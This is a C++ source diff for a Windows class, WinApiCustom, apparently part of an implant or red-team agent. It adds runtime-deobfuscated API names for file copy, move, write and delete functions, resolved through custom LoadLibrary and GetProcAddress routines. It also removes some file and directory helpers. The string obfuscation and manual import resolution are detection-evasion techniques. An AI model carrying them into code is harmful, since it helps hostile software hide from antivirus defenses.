@@ -492,6 +492,72 @@ WinApiCustom::WinApiCustom()
 		STRING_FIND_CLOSE_LEN,
 		strFindClose);
 
+	static CHAR strGetFileAttributesA[STRING_GET_FILE_ATTRIBUTES_A_LEN + 1] = ""; // "GetFileAttributesA"
+	DeobfuscateUtf8String(
+		(PCHAR)STRING_GET_FILE_ATTRIBUTES_A,
+		STRING_GET_FILE_ATTRIBUTES_A_LEN,
+		strGetFileAttributesA);
+
+	static CHAR strCopyFileA[STRING_COPY_FILE_A_LEN + 1] = ""; // "CopyFileA"
+	DeobfuscateUtf8String(
+		(PCHAR)STRING_COPY_FILE_A,
+		STRING_COPY_FILE_A_LEN,
+		strCopyFileA);
+
+	static CHAR strCreateDirectoryA[STRING_CREATE_DIRECTORY_A_LEN + 1] = ""; // "CreateDirectoryA"
+	DeobfuscateUtf8String(
+		(PCHAR)STRING_CREATE_DIRECTORY_A,
+		STRING_CREATE_DIRECTORY_A_LEN,
+		strCreateDirectoryA);
+
+	static CHAR strFileTimeToSystemTime[STRING_FILE_TIME_TO_SYSTEM_TIME_LEN + 1] = ""; // "FileTimeToSystemTime"
+	DeobfuscateUtf8String(
+		(PCHAR)STRING_FILE_TIME_TO_SYSTEM_TIME,
+		STRING_FILE_TIME_TO_SYSTEM_TIME_LEN,
+		strFileTimeToSystemTime);
+
+	static CHAR strGetDateFormatEx[STRING_GET_DATE_FORMAT_EX_LEN + 1] = ""; // "GetDateFormatEx"
+	DeobfuscateUtf8String(
+		(PCHAR)STRING_GET_DATE_FORMAT_EX,
+		STRING_GET_DATE_FORMAT_EX_LEN,
+		strGetDateFormatEx);
+
+	static CHAR strGetTimeFormatEx[STRING_GET_TIME_FORMAT_EX_LEN + 1] = ""; // "GetTimeFormatEx"
+	DeobfuscateUtf8String(
+		(PCHAR)STRING_GET_TIME_FORMAT_EX,
+		STRING_GET_TIME_FORMAT_EX_LEN,
+		strGetTimeFormatEx);
+
+	static CHAR strMoveFileExA[STRING_MOVE_FILE_EX_A_LEN + 1] = ""; // "MoveFileExA"
+	DeobfuscateUtf8String(
+		(PCHAR)STRING_MOVE_FILE_EX_A,
+		STRING_MOVE_FILE_EX_A_LEN,
+		strMoveFileExA);
+
+	static CHAR strSetFilePointerEx[STRING_SET_FILE_POINTER_EX_LEN + 1] = ""; // "SetFilePointerEx"
+	DeobfuscateUtf8String(
+		(PCHAR)STRING_SET_FILE_POINTER_EX,
+		STRING_SET_FILE_POINTER_EX_LEN,
+		strSetFilePointerEx);
+
+	static CHAR strWriteFile[STRING_WRITE_FILE_LEN + 1] = ""; // "WriteFile"
+	DeobfuscateUtf8String(
+		(PCHAR)STRING_WRITE_FILE,
+		STRING_WRITE_FILE_LEN,
+		strWriteFile);
+
+	static CHAR strDeleteFileA[STRING_DELETE_FILE_A_LEN + 1] = ""; // "DeleteFileA"
+	DeobfuscateUtf8String(
+		(PCHAR)STRING_DELETE_FILE_A,
+		STRING_DELETE_FILE_A_LEN,
+		strDeleteFileA);
+
+	static CHAR strRemoveDirectoryA[STRING_REMOVE_DIRECTORY_A_LEN + 1] = ""; // "RemoveDirectoryA"
+	DeobfuscateUtf8String(
+		(PCHAR)STRING_REMOVE_DIRECTORY_A,
+		STRING_REMOVE_DIRECTORY_A_LEN,
+		strRemoveDirectoryA);
+
 	// Load necessary modules
 	loadedModules.hNtdll = LoadLibraryCustom(strNtdllDll);
 	loadedModules.hKernelbase = LoadLibraryCustom(strKernelbaseDll);
@@ -549,6 +615,17 @@ WinApiCustom::WinApiCustom()
 	loadedFunctions.FindFirstFileA = (HANDLE(*)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData))GetProcAddressCustom(loadedModules.hKernel32, strFindFirstFileA);
 	loadedFunctions.FindNextFileA = (BOOL(*)(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData))GetProcAddressCustom(loadedModules.hKernel32, strFindNextFileA);
 	loadedFunctions.FindClose = (BOOL(*)(HANDLE hFindFile))GetProcAddressCustom(loadedModules.hKernel32, strFindClose);
+	loadedFunctions.GetFileAttributesA = (DWORD(*)(LPCSTR lpFileName))GetProcAddressCustom(loadedModules.hKernel32, strGetFileAttributesA);
+	loadedFunctions.CopyFileA = (BOOL(*)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists))GetProcAddressCustom(loadedModules.hKernel32, strCopyFileA);
+	loadedFunctions.CreateDirectoryA = (BOOL(*)(LPCSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes))GetProcAddressCustom(loadedModules.hKernel32, strCreateDirectoryA);
+	loadedFunctions.FileTimeToSystemTime = (BOOL(*)(FILETIME * lpFileTime, LPSYSTEMTIME lpSystemTime)) GetProcAddressCustom(loadedModules.hKernel32, strFileTimeToSystemTime);
+	loadedFunctions.GetDateFormatEx = (int (*)(LPCWSTR lpLocaleName, DWORD dwFlags, SYSTEMTIME *lpDate, LPCWSTR lpFormat, LPWSTR lpDateStr, int cchDate, LPCWSTR lpCalendar))GetProcAddressCustom(loadedModules.hKernel32, strGetDateFormatEx);
+	loadedFunctions.GetTimeFormatEx = (int (*)(LPCWSTR lpLocaleName, DWORD dwFlags, SYSTEMTIME *lpTime, LPCWSTR lpFormat, LPWSTR lpTimeStr, int cchTime))GetProcAddressCustom(loadedModules.hKernel32, strGetTimeFormatEx);
+	loadedFunctions.MoveFileExA = (BOOL(*)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, DWORD dwFlags))GetProcAddressCustom(loadedModules.hKernel32, strMoveFileExA);
+	loadedFunctions.SetFilePointerEx = (BOOL(*)(HANDLE hFile, LARGE_INTEGER liDistanceToMove, PLARGE_INTEGER lpNewFilePointer, DWORD dwMoveMethod))GetProcAddressCustom(loadedModules.hKernel32, strSetFilePointerEx);
+	loadedFunctions.WriteFile = (BOOL(*)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped))GetProcAddressCustom(loadedModules.hKernel32, strWriteFile);
+	loadedFunctions.DeleteFileA = (BOOL(*)(LPCSTR lpFileName))GetProcAddressCustom(loadedModules.hKernel32, strDeleteFileA);
+	loadedFunctions.RemoveDirectoryA = (BOOL(*)(LPCSTR lpPathName))GetProcAddressCustom(loadedModules.hKernel32, strRemoveDirectoryA);
 }
 
 /* Destructor for WinApiCustom */
@@ -701,285 +778,4 @@ LPVOID WinApiCustom::GetFQDNComputer()
 	}
 
 	return computerNameBuf;
-}
-
-/*
-Gets current working directory
-
-Returned pointer (if not NULL) points to buffer that must be manually freed
-*/
-PCHAR WinApiCustom::GetCurrentWorkingDirectoryCustom()
-{
-	DWORD bufferLength = 0;
-	LPVOID pBuffer = NULL;
-
-	bufferLength = this->loadedFunctions.GetCurrentDirectoryA(bufferLength, (LPSTR)pBuffer);
-	if (bufferLength == 0)
-		return NULL;
-
-	pBuffer = this->HeapAllocCustom(bufferLength);
-	if (pBuffer == NULL)
-		return NULL;
-
-	bufferLength = this->loadedFunctions.GetCurrentDirectoryA(bufferLength, (LPSTR)pBuffer);
-	if (bufferLength == 0)
-	{
-		this->HeapFreeCustom(pBuffer);
-		return NULL;
-	}
-	else
-	{
-		return (PCHAR)pBuffer;
-	}
-}
-
-/*
-Change current directory
-*/
-BOOL WinApiCustom::ChangeCurrentWorkingDirectoryCustom(PCHAR dirPath)
-{
-	if (dirPath != NULL && StrLen(dirPath) != 0)
-	{
-		return this->loadedFunctions.SetCurrentDirectoryA(dirPath);
-	}
-	return FALSE;
-}
-
-/*
-Reads an existing file
-
-Returned pointer points to the file contents buffer and must be manually freed for cleanup
-*/
-LPVOID WinApiCustom::ReadFileCustom(PCHAR filePath)
-{
-	LPVOID fileContents = NULL;
-
-	HANDLE hFile = this->loadedFunctions.CreateFileA(
-		filePath,
-		GENERIC_READ,
-		FILE_SHARE_READ,
-		NULL,
-		OPEN_EXISTING,
-		0,
-		NULL);
-	if (hFile == INVALID_HANDLE_VALUE || hFile == NULL)
-		goto CLEANUP;
-
-	LARGE_INTEGER fileSizeLI;
-	fileSizeLI.QuadPart = 0;
-	if (!this->loadedFunctions.GetFileSizeEx(
-			hFile,
-			&fileSizeLI))
-		goto CLEANUP;
-	if (fileSizeLI.QuadPart == 0)
-		goto CLEANUP;
-
-	HANDLE hFileMappingObject = this->loadedFunctions.CreateFileMappingA(
-		hFile,
-		NULL,
-		PAGE_READONLY,
-		0,
-		0,
-		NULL);
-	if (hFileMappingObject == NULL)
-		goto CLEANUP;
-
-	LPVOID pFileView = this->loadedFunctions.MapViewOfFile(
-		hFileMappingObject,
-		FILE_MAP_READ,
-		0,
-		0,
-		0);
-	if (pFileView == NULL)
-		goto CLEANUP;
-
-	fileContents = this->HeapAllocCustom(fileSizeLI.QuadPart);
-	if (fileContents == NULL)
-		goto CLEANUP;
-
-	CopyBuffer(fileContents, pFileView, (DWORD64)fileSizeLI.QuadPart);
-
-CLEANUP:
-	if (pFileView)
-		this->loadedFunctions.UnmapViewOfFile(pFileView);
-
-	if (hFileMappingObject)
-		this->loadedFunctions.CloseHandle(hFileMappingObject);
-
-	if (hFile)
-		this->loadedFunctions.CloseHandle(hFile);
-
-	return fileContents;
-}
-
-/*
-Writes specific content to a file
-
-Returns TRUE if write is successful
-*/
-BOOL WinApiCustom::WriteFileCustom(PCHAR filePath, LPVOID whatToWrite, DWORD64 whatToWriteSize)
-{
-	BOOL result = FALSE;
-
-	HANDLE hFile = this->loadedFunctions.CreateFileA(
-		filePath,
-		GENERIC_READ | GENERIC_WRITE,
-		FILE_SHARE_READ,
-		NULL,
-		CREATE_ALWAYS,
-		FILE_ATTRIBUTE_NORMAL,
-		NULL);
-	if (hFile == INVALID_HANDLE_VALUE || hFile == NULL)
-		goto CLEANUP;
-
-	DWORD fileSizeHighDword = HIDWORD(whatToWriteSize);
-	DWORD fileSizeLowDword = LODWORD(whatToWriteSize);
-
-	HANDLE hFileMappingObject = this->loadedFunctions.CreateFileMappingA(
-		hFile,
-		NULL,
-		PAGE_READWRITE,
-		fileSizeHighDword,
-		fileSizeLowDword,
-		NULL);
-	if (hFileMappingObject == NULL)
-		goto CLEANUP;
-
-	LPVOID pFileView = this->loadedFunctions.MapViewOfFile(
-		hFileMappingObject,
-		FILE_MAP_WRITE,
-		0,
-		0,
-		0);
-	if (pFileView == NULL)
-		goto CLEANUP;
-
-	CopyBuffer(pFileView, whatToWrite, whatToWriteSize);
-
-	if (!this->loadedFunctions.FlushViewOfFile(pFileView, 0))
-		goto CLEANUP;
-
-	if (!this->loadedFunctions.FlushFileBuffers(hFile))
-		goto CLEANUP;
-
-	result = TRUE;
-
-CLEANUP:
-	if (pFileView)
-		this->loadedFunctions.UnmapViewOfFile(pFileView);
-
-	if (hFileMappingObject)
-		this->loadedFunctions.CloseHandle(hFileMappingObject);
-
-	if (hFile)
-		this->loadedFunctions.CloseHandle(hFile);
-
-	return result;
-}
-
-/*
-Finds out contents of a directory
-
-dirPath: Directory path to search in; automatically appends required "\*" as needed
-ppDirListing: Pointer to a PWIN32_FIND_DATAA that will get output as address to an array of WIN32_FIND_DATAA
-pDirListingSize: Pointer to DWORD that stores size of above array of WIN32_FIND_DATAA
-
-*ppDirListing must be manually freed
-*/
-BOOL WinApiCustom::ListDirectoryCustom(IN PCHAR dirPath, OUT WIN32_FIND_DATAA **ppDirListing, OUT PDWORD pDirListingSize)
-{
-	if (dirPath == NULL)
-		return FALSE;
-
-	BOOL returnVal = FALSE;
-	DWORD dirPathLen = StrLen(dirPath);
-	DWORD dirPathRequiredLen = dirPathLen;
-	PCHAR dirPathRequired = dirPath;
-	HANDLE hFindFile = INVALID_HANDLE_VALUE;
-	*ppDirListing = NULL;
-	*pDirListingSize = 0;
-
-	// If path does not end in "\*", append it
-	if (!(dirPath[dirPathLen - 2] == '\\' && dirPath[dirPathLen - 1] == '*'))
-	{
-		// If path ends with "\"
-		if (dirPath[dirPathLen - 1] == '\\')
-		{
-			dirPathRequiredLen += 1;
-		}
-
-		// Else if path ends with directory name only
-		else
-		{
-			dirPathRequiredLen += 2;
-		}
-	}
-	if (dirPathRequiredLen != dirPathLen)
-	{
-		dirPathRequired = (PCHAR)this->HeapAllocCustom(dirPathRequiredLen + 1);
-		if (dirPathRequired == NULL)
-			goto CLEANUP;
-
-		ConcatString(dirPathRequired, dirPath);
-		if (dirPathRequiredLen - 2 == dirPathLen)
-			ConcatString(dirPathRequired, "\\*");
-		else if (dirPathRequiredLen - 1 == dirPathLen)
-			ConcatString(dirPathRequired, "*");
-		else
-			goto CLEANUP;
-	}
-
-	// Find out size of buffer needed to contain information about all found files
-	WIN32_FIND_DATAA findDataA;
-	RtlZeroMemoryCustom((PBYTE)(&findDataA), sizeof(WIN32_FIND_DATAA));
-
-	hFindFile = this->loadedFunctions.FindFirstFileA(dirPathRequired, &findDataA);
-	if (hFindFile == INVALID_HANDLE_VALUE)
-		goto CLEANUP;
-	do
-	{
-		*pDirListingSize += sizeof(findDataA);
-	} while (this->loadedFunctions.FindNextFileA(hFindFile, &findDataA));
-
-	if (*pDirListingSize == 0)
-		goto CLEANUP;
-
-	if (!this->loadedFunctions.FindClose(hFindFile))
-		goto CLEANUP;
-
-	// Create buffer and copy all results into it
-	hFindFile = this->loadedFunctions.FindFirstFileA(dirPathRequired, &findDataA);
-	if (hFindFile == INVALID_HANDLE_VALUE)
-		goto CLEANUP;
-
-	*ppDirListing = (PWIN32_FIND_DATAA)this->HeapAllocCustom(*pDirListingSize);
-	if (*ppDirListing == NULL)
-		goto CLEANUP;
-	PWIN32_FIND_DATAA pDirListingWrite = *ppDirListing;
-	DWORD dataWrittenSize = 0;
-	do
-	{
-		CopyBuffer((LPVOID)pDirListingWrite, (LPVOID)(&findDataA), sizeof(findDataA));
-		dataWrittenSize += sizeof(findDataA);
-		++pDirListingWrite;
-	} while (this->loadedFunctions.FindNextFileA(hFindFile, &findDataA) && (dataWrittenSize < *pDirListingSize));
-
-	// If execution reaches here, all went well
-	returnVal = TRUE;
-
-CLEANUP:
-	if ((dirPathRequiredLen != dirPathLen) && (dirPathRequired != NULL))
-		this->HeapFreeCustom(dirPathRequired);
-
-	if (hFindFile != NULL && hFindFile != INVALID_HANDLE_VALUE)
-	{
-		this->loadedFunctions.FindClose(hFindFile);
-	}
-
-	return returnVal;
-}
-
-// TODO
-void DescribeDirectoryListingCustom()
-{
 }
